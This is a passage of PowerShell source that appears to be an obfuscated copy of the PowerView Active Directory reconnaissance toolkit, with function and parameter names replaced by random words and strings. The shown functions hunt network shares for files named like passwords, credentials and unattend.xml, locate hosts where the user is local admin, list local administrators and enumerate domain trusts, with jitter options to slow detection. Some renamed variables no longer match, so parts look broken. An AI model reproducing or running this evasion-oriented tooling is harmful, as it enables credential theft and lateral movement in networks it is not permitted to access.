                Start-Sleep -Seconds $oGsSshCv99.Next((1-$uPQrThoX99)*$Delay, (1+$uPQrThoX99)*$Delay)

                Write-Verbose "[Josef] Enumerating server $baXLhAGw99 ($ADMsIjFY99 of $($OMilugXw99.count))"
                Invoke-Command -atfuqJht99 $ESVuaknJ99 -ArgumentList $baXLhAGw99, $PCGKuwQz99, $glRtrabU99
            }
        }
        else {
            Write-Verbose "[Josef] Using threading with threads: $egZrjTFJ99"

            $FjHZlPac99 = @{
                'CheckShareAccess' = $PCGKuwQz99
                'TokenHandle' = $glRtrabU99
            }

            uterus -wkNUqpQt99 $OMilugXw99 -atfuqJht99 $ESVuaknJ99 -tUtdHhZX99 $FjHZlPac99 -egZrjTFJ99 $egZrjTFJ99
        }
    }

    END {
        if ($glRtrabU99) {
            impregnates -LHlspMYk99 $glRtrabU99
        }
    }
}


function branched {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $wkNUqpQt99,

        [ValidateNotNullOrEmpty()]
        [String]
        $eYhHHjYI99,

        [ValidateNotNullOrEmpty()]
        [String]
        $aLBeTPoV99,

        [ValidateNotNullOrEmpty()]
        [String]
        $fTvmLSVQ99,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $hhyeAfOa99,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $MFXSjlPv99,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $qEkuFkiO99,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $AkfROeHj99 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $GFDzqrbq99,

        [String[]]
        $ySHLiQah99 = @('C$', 'Admin$', 'Print$', 'IPC$'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $SmkTVNwX99,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $ISmnkJsO99,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EqWZvqmg99,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $hTMCMOHq99,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $spzxCeQE99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $uPQrThoX99 = .3,

        [Int]
        [ValidateRange(1, 100)]
        $egZrjTFJ99 = 20
    )

    BEGIN {
        $ZotlnKrB99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ZotlnKrB99['Domain'] = $eYhHHjYI99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ZotlnKrB99['LDAPFilter'] = $aLBeTPoV99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $ZotlnKrB99['SearchBase'] = $fTvmLSVQ99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ZotlnKrB99['OperatingSystem'] = $DfPrQYoc99 }
        if ($PSBoundParameters['ComputerServicePack']) { $ZotlnKrB99['ServicePack'] = $kKsiFEfu99 }
        if ($PSBoundParameters['ComputerSiteName']) { $ZotlnKrB99['SiteName'] = $ZBmuuCEe99 }
        if ($PSBoundParameters['Server']) { $ZotlnKrB99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $ZotlnKrB99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $ZotlnKrB99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ZotlnKrB99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $ZotlnKrB99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $ZotlnKrB99['Credential'] = $ZiReXCQu99 }

        if ($PSBoundParameters['ComputerName']) {
            $OMilugXw99 = $wkNUqpQt99
        }
        else {
            Write-Verbose '[branched] Querying computers in the domain'
            $OMilugXw99 = Rankine @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[branched] TargetComputers length: $($OMilugXw99.Length)"
        if ($OMilugXw99.Length -eq 0) {
            throw '[branched] No hosts found to enumerate'
        }

        $ESVuaknJ99 = {
            Param($wkNUqpQt99, $AkfROeHj99, $ySHLiQah99, $hTMCMOHq99, $jaWXlgci99, $spzxCeQE99, $guhuHWYJ99, $LHlspMYk99)

            if ($LHlspMYk99) {
                $Null = sinfulness -LHlspMYk99 $LHlspMYk99 -Quiet
            }

            ForEach ($baXLhAGw99 in $wkNUqpQt99) {

                $QQBJJfmE99 = @()
                if ($baXLhAGw99.StartsWith('\\')) {
                    $QQBJJfmE99 += $baXLhAGw99
                }
                else {
                    $Up = Test-Connection -Count 1 -Quiet -wkNUqpQt99 $baXLhAGw99
                    if ($Up) {
                        $aaSlEMZv99 = deferment -wkNUqpQt99 $baXLhAGw99
                        ForEach ($Share in $aaSlEMZv99) {
                            $sRfeUCXV99 = $Share.Name
                            $Path = '\\'+$baXLhAGw99+'\'+$sRfeUCXV99
                            if (($sRfeUCXV99) -and ($sRfeUCXV99.Trim() -ne '')) {
                                if ($ySHLiQah99 -NotContains $sRfeUCXV99) {
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        $QQBJJfmE99 += $Path
                                    }
                                    catch {
                                        Write-Verbose "[!] No access to $Path"
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach ($Share in $QQBJJfmE99) {
                    Write-Verbose "Searching share: $Share"
                    $PJVaCnHs99 = @{
                        'Path' = $Share
                        'Include' = $AkfROeHj99
                    }
                    if ($hTMCMOHq99) {
                        $PJVaCnHs99['OfficeDocs'] = $hTMCMOHq99
                    }
                    if ($spzxCeQE99) {
                        $PJVaCnHs99['FreshEXEs'] = $spzxCeQE99
                    }
                    if ($SmkTVNwX99) {
                        $PJVaCnHs99['LastAccessTime'] = $SmkTVNwX99
                    }
                    if ($ISmnkJsO99) {
                        $PJVaCnHs99['LastWriteTime'] = $ISmnkJsO99
                    }
                    if ($EqWZvqmg99) {
                        $PJVaCnHs99['CreationTime'] = $EqWZvqmg99
                    }
                    if ($guhuHWYJ99) {
                        $PJVaCnHs99['CheckWriteAccess'] = $guhuHWYJ99
                    }
                    congregates @SearchArgs
                }
            }

            if ($LHlspMYk99) {
                impregnates
            }
        }

        $glRtrabU99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99
            }
            else {
                $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99 -Quiet
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[branched] Total number of hosts: $($OMilugXw99.count)"
            Write-Verbose "[branched] Delay: $Delay, Jitter: $uPQrThoX99"
            $ADMsIjFY99 = 0
            $oGsSshCv99 = New-Object System.Random

            ForEach ($baXLhAGw99 in $OMilugXw99) {
                $ADMsIjFY99 = $ADMsIjFY99 + 1

                Start-Sleep -Seconds $oGsSshCv99.Next((1-$uPQrThoX99)*$Delay, (1+$uPQrThoX99)*$Delay)

                Write-Verbose "[branched] Enumerating server $baXLhAGw99 ($ADMsIjFY99 of $($OMilugXw99.count))"
                Invoke-Command -atfuqJht99 $ESVuaknJ99 -ArgumentList $baXLhAGw99, $AkfROeHj99, $ySHLiQah99, $hTMCMOHq99, $jaWXlgci99, $spzxCeQE99, $guhuHWYJ99, $glRtrabU99
            }
        }
        else {
            Write-Verbose "[branched] Using threading with threads: $egZrjTFJ99"

            $FjHZlPac99 = @{
                'Include' = $AkfROeHj99
                'ExcludedShares' = $ySHLiQah99
                'OfficeDocs' = $hTMCMOHq99
                'ExcludeHidden' = $jaWXlgci99
                'FreshEXEs' = $spzxCeQE99
                'CheckWriteAccess' = $guhuHWYJ99
                'TokenHandle' = $glRtrabU99
            }

            uterus -wkNUqpQt99 $OMilugXw99 -atfuqJht99 $ESVuaknJ99 -tUtdHhZX99 $FjHZlPac99 -egZrjTFJ99 $egZrjTFJ99
        }
    }

    END {
        if ($glRtrabU99) {
            impregnates -LHlspMYk99 $glRtrabU99
        }
    }
}


function industrialize {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $wkNUqpQt99,

        [ValidateNotNullOrEmpty()]
        [String]
        $eYhHHjYI99,

        [ValidateNotNullOrEmpty()]
        [String]
        $aLBeTPoV99,

        [ValidateNotNullOrEmpty()]
        [String]
        $fTvmLSVQ99,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $hhyeAfOa99,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $MFXSjlPv99,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $qEkuFkiO99,

        [Switch]
        $PCGKuwQz99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $uPQrThoX99 = .3,

        [Int]
        [ValidateRange(1, 100)]
        $egZrjTFJ99 = 20
    )

    BEGIN {
        $ZotlnKrB99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ZotlnKrB99['Domain'] = $eYhHHjYI99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ZotlnKrB99['LDAPFilter'] = $aLBeTPoV99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $ZotlnKrB99['SearchBase'] = $fTvmLSVQ99 }
        if ($PSBoundParameters['Unconstrained']) { $ZotlnKrB99['Unconstrained'] = $gxCjQSqn99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ZotlnKrB99['OperatingSystem'] = $DfPrQYoc99 }
        if ($PSBoundParameters['ComputerServicePack']) { $ZotlnKrB99['ServicePack'] = $kKsiFEfu99 }
        if ($PSBoundParameters['ComputerSiteName']) { $ZotlnKrB99['SiteName'] = $ZBmuuCEe99 }
        if ($PSBoundParameters['Server']) { $ZotlnKrB99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $ZotlnKrB99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $ZotlnKrB99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ZotlnKrB99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $ZotlnKrB99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $ZotlnKrB99['Credential'] = $ZiReXCQu99 }

        if ($PSBoundParameters['ComputerName']) {
            $OMilugXw99 = $wkNUqpQt99
        }
        else {
            Write-Verbose '[industrialize] Querying computers in the domain'
            $OMilugXw99 = Rankine @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[industrialize] TargetComputers length: $($OMilugXw99.Length)"
        if ($OMilugXw99.Length -eq 0) {
            throw '[industrialize] No hosts found to enumerate'
        }

        $ESVuaknJ99 = {
            Param($wkNUqpQt99, $LHlspMYk99)

            if ($LHlspMYk99) {
                $Null = sinfulness -LHlspMYk99 $LHlspMYk99 -Quiet
            }

            ForEach ($baXLhAGw99 in $wkNUqpQt99) {
                $Up = Test-Connection -Count 1 -Quiet -wkNUqpQt99 $baXLhAGw99
                if ($Up) {
                    $tFyIWLJO99 = maimed -wkNUqpQt99 $baXLhAGw99
                    if ($tFyIWLJO99.IsAdmin) {
                        $baXLhAGw99
                    }
                }
            }

            if ($LHlspMYk99) {
                impregnates
            }
        }

        $glRtrabU99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99
            }
            else {
                $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99 -Quiet
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[industrialize] Total number of hosts: $($OMilugXw99.count)"
            Write-Verbose "[industrialize] Delay: $Delay, Jitter: $uPQrThoX99"
            $ADMsIjFY99 = 0
            $oGsSshCv99 = New-Object System.Random

            ForEach ($baXLhAGw99 in $OMilugXw99) {
                $ADMsIjFY99 = $ADMsIjFY99 + 1

                Start-Sleep -Seconds $oGsSshCv99.Next((1-$uPQrThoX99)*$Delay, (1+$uPQrThoX99)*$Delay)

                Write-Verbose "[industrialize] Enumerating server $baXLhAGw99 ($ADMsIjFY99 of $($OMilugXw99.count))"
                Invoke-Command -atfuqJht99 $ESVuaknJ99 -ArgumentList $baXLhAGw99, $glRtrabU99
            }
        }
        else {
            Write-Verbose "[industrialize] Using threading with threads: $egZrjTFJ99"

            $FjHZlPac99 = @{
                'TokenHandle' = $glRtrabU99
            }

            uterus -wkNUqpQt99 $OMilugXw99 -atfuqJht99 $ESVuaknJ99 -tUtdHhZX99 $FjHZlPac99 -egZrjTFJ99 $egZrjTFJ99
        }
    }
}


function killdeer {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $wkNUqpQt99,

        [ValidateNotNullOrEmpty()]
        [String]
        $eYhHHjYI99,

        [ValidateNotNullOrEmpty()]
        [String]
        $aLBeTPoV99,

        [ValidateNotNullOrEmpty()]
        [String]
        $fTvmLSVQ99,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $hhyeAfOa99,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $MFXSjlPv99,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $qEkuFkiO99,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $nVmmyinF99 = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $RotDAwGI99 = 'API',

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $uPQrThoX99 = .3,

        [Int]
        [ValidateRange(1, 100)]
        $egZrjTFJ99 = 20
    )

    BEGIN {
        $ZotlnKrB99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ZotlnKrB99['Domain'] = $eYhHHjYI99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ZotlnKrB99['LDAPFilter'] = $aLBeTPoV99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $ZotlnKrB99['SearchBase'] = $fTvmLSVQ99 }
        if ($PSBoundParameters['Unconstrained']) { $ZotlnKrB99['Unconstrained'] = $gxCjQSqn99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ZotlnKrB99['OperatingSystem'] = $DfPrQYoc99 }
        if ($PSBoundParameters['ComputerServicePack']) { $ZotlnKrB99['ServicePack'] = $kKsiFEfu99 }
        if ($PSBoundParameters['ComputerSiteName']) { $ZotlnKrB99['SiteName'] = $ZBmuuCEe99 }
        if ($PSBoundParameters['Server']) { $ZotlnKrB99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $ZotlnKrB99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $ZotlnKrB99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ZotlnKrB99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $ZotlnKrB99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $ZotlnKrB99['Credential'] = $ZiReXCQu99 }

        if ($PSBoundParameters['ComputerName']) {
            $OMilugXw99 = $wkNUqpQt99
        }
        else {
            Write-Verbose '[killdeer] Querying computers in the domain'
            $OMilugXw99 = Rankine @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[killdeer] TargetComputers length: $($OMilugXw99.Length)"
        if ($OMilugXw99.Length -eq 0) {
            throw '[killdeer] No hosts found to enumerate'
        }

        $ESVuaknJ99 = {
            Param($wkNUqpQt99, $nVmmyinF99, $RotDAwGI99, $LHlspMYk99)

            if ($nVmmyinF99 -eq "Administrators") {
                $SBwjqnkO99 = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                $nVmmyinF99 = ($SBwjqnkO99.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }

            if ($LHlspMYk99) {
                $Null = sinfulness -LHlspMYk99 $LHlspMYk99 -Quiet
            }

            ForEach ($baXLhAGw99 in $wkNUqpQt99) {
                $Up = Test-Connection -Count 1 -Quiet -wkNUqpQt99 $baXLhAGw99
                if ($Up) {
                    $ESqdEEHS99 = @{
                        'ComputerName' = $baXLhAGw99
                        'Method' = $RotDAwGI99
                        'GroupName' = $nVmmyinF99
                    }
                    Mobutu @NetLocalGroupMemberArguments
                }
            }

            if ($LHlspMYk99) {
                impregnates
            }
        }

        $glRtrabU99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99
            }
            else {
                $glRtrabU99 = sinfulness -ZiReXCQu99 $ZiReXCQu99 -Quiet
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[killdeer] Total number of hosts: $($OMilugXw99.count)"
            Write-Verbose "[killdeer] Delay: $Delay, Jitter: $uPQrThoX99"
            $ADMsIjFY99 = 0
            $oGsSshCv99 = New-Object System.Random

            ForEach ($baXLhAGw99 in $OMilugXw99) {
                $ADMsIjFY99 = $ADMsIjFY99 + 1

                Start-Sleep -Seconds $oGsSshCv99.Next((1-$uPQrThoX99)*$Delay, (1+$uPQrThoX99)*$Delay)

                Write-Verbose "[killdeer] Enumerating server $baXLhAGw99 ($ADMsIjFY99 of $($OMilugXw99.count))"
                Invoke-Command -atfuqJht99 $ESVuaknJ99 -ArgumentList $baXLhAGw99, $nVmmyinF99, $RotDAwGI99, $glRtrabU99
            }
        }
        else {
            Write-Verbose "[killdeer] Using threading with threads: $egZrjTFJ99"

            $FjHZlPac99 = @{
                'GroupName' = $nVmmyinF99
                'Method' = $RotDAwGI99
                'TokenHandle' = $glRtrabU99
            }

            uterus -wkNUqpQt99 $OMilugXw99 -atfuqJht99 $ESVuaknJ99 -tUtdHhZX99 $FjHZlPac99 -egZrjTFJ99 $egZrjTFJ99
        }
    }

    END {
        if ($glRtrabU99) {
            impregnates -LHlspMYk99 $glRtrabU99
        }
    }
}



function flounder {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kaLEgole99,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $uomKXjrL99,

        [Alias('ReturnOne')]
        [Switch]
        $iRGTotKK99,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $wLdXsajg99 = @{
            [uint32]'0x00000001' = 'NON_TRANSITIVE'
            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
            [uint32]'0x00000004' = 'FILTER_SIDS'
            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
            [uint32]'0x00000020' = 'WITHIN_FOREST'
            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
            [uint32]'0x00000400' = 'PIM_TRUST'
        }

        $fXuRKLCB99 = @{}
        if ($PSBoundParameters['Domain']) { $fXuRKLCB99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['LDAPFilter']) { $fXuRKLCB99['LDAPFilter'] = $RUtJqxpA99 }
        if ($PSBoundParameters['Properties']) { $fXuRKLCB99['Properties'] = $kaLEgole99 }
        if ($PSBoundParameters['SearchBase']) { $fXuRKLCB99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $fXuRKLCB99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $fXuRKLCB99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $fXuRKLCB99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $fXuRKLCB99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $fXuRKLCB99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $fXuRKLCB99['Credential'] = $ZiReXCQu99 }
    }

    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne 'API') {
            $QoVwGkLA99 = @{}
            if ($XQOKQXGr99 -and $XQOKQXGr99.Trim() -ne '') {
                $zvvelQNm99 = $XQOKQXGr99
            }
            else {
                if ($PSBoundParameters['Credential']) {
                    $zvvelQNm99 = (philately -ZiReXCQu99 $ZiReXCQu99).Name
                }
                else {
                    $zvvelQNm99 = (philately).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne 'NET') {
            if ($XQOKQXGr99 -and $XQOKQXGr99.Trim() -ne '') {
                $zvvelQNm99 = $XQOKQXGr99
            }
            else {
                $zvvelQNm99 = $Env:USERDNSDOMAIN
            }
        }

        if ($PsCmdlet.ParameterSetName -eq 'LDAP') {
            $VFfDfwvo99 = foaling @LdapSearcherArguments
            $eJEdtfMT99 = beauteous @NetSearcherArguments

            if ($VFfDfwvo99) {

                $VFfDfwvo99.Filter = '(objectClass=trustedDomain)'

                if ($PSBoundParameters['FindOne']) { $vDOGrGBR99 = $VFfDfwvo99.FindOne() }
                else { $vDOGrGBR99 = $VFfDfwvo99.FindAll() }
                $vDOGrGBR99 | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $acXsZsNW99 = New-Object PSObject

                    $wtBzLtek99 = @()
                    $wtBzLtek99 += $wLdXsajg99.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $wLdXsajg99[$_] }

                    $zCxVfRms99 = Switch ($Props.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }

                    $fwmaItYQ99 = Switch ($Props.trusttype) {
                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                        3 { 'MIT' }
                    }

                    $JsUhIxkj99 = $Props.distinguishedname[0]
                    $aRWGJCMN99 = $JsUhIxkj99.IndexOf('DC=')
                    if ($aRWGJCMN99) {
                        $zvvelQNm99 = $($JsUhIxkj99.SubString($aRWGJCMN99)) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        $zvvelQNm99 = ""
                    }

                    $WvXPVUTP99 = $JsUhIxkj99.IndexOf(',CN=System')
                    if ($aRWGJCMN99) {
                        $bfrmITkR99 = $JsUhIxkj99.SubString(3, $WvXPVUTP99-3)
                    }
                    else {
                        $bfrmITkR99 = ""
                    }

                    $SesfxDsF99 = New-Object Guid @(,$Props.objectguid[0])
                    $UZgPkOzH99 = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value

                    $acXsZsNW99 | Add-Member Noteproperty 'SourceName' $zvvelQNm99
                    $acXsZsNW99 | Add-Member Noteproperty 'TargetName' $Props.name[0]
                    $acXsZsNW99 | Add-Member Noteproperty 'TrustType' $fwmaItYQ99
                    $acXsZsNW99 | Add-Member Noteproperty 'TrustAttributes' $($wtBzLtek99 -join ',')
                    $acXsZsNW99 | Add-Member Noteproperty 'TrustDirection' "$zCxVfRms99"
                    $acXsZsNW99 | Add-Member Noteproperty 'WhenCreated' $Props.whencreated[0]
                    $acXsZsNW99 | Add-Member Noteproperty 'WhenChanged' $Props.whenchanged[0]
                    $acXsZsNW99.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                    $acXsZsNW99
                }
                if ($vDOGrGBR99) {
                    try { $vDOGrGBR99.dispose() }
                    catch {
                        Write-Verbose "[flounder] Error disposing of the Results object: $_"
                    }
                }
                $VFfDfwvo99.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq 'API') {
            if ($PSBoundParameters['Server']) {
                $XBNyLQub99 = $VmSwBdTN99
            }
            elseif ($XQOKQXGr99 -and $XQOKQXGr99.Trim() -ne '') {
                $XBNyLQub99 = $XQOKQXGr99
            }
            else {
                $XBNyLQub99 = $Null
            }

            $mAzkenkf99 = [IntPtr]::Zero

            $Flags = 63
            $VdcPSFws99 = 0

            $BSvRtRei99 = $lXLOcMXI99::DsEnumerateDomainTrusts($XBNyLQub99, $Flags, [ref]$mAzkenkf99, [ref]$VdcPSFws99)

            $edhaIdNu99 = $mAzkenkf99.ToInt64()

            if (($BSvRtRei99 -eq 0) -and ($edhaIdNu99 -gt 0)) {

